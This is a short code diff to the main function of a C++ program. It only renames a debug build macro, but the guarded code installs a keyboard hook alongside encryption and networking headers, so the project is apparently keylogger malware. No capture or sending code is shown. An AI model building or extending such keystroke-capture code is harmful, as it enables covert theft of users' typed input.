@@ -4,14 +4,13 @@
 #include "sys.h"
 #include "encrypt.h"
 #include "net.h"
-
-//#define DEBUG
+#include "debug.h"
 
 int main() {
-#ifdef DEBUG
+#ifdef DEBUG_BUILD
 #endif
 
-#ifndef DEBUG
+#ifndef DEBUG_BUILD
   Crypt::GenerateKeys();
   KeyHook::InstallHook();
 
@@ -26,7 +25,7 @@ int main() {
 						5);
 
   KeyHook::HandleMessage(true);
-#endif
+#endif // DEBUG_BUILD
   return 0;
 }
 
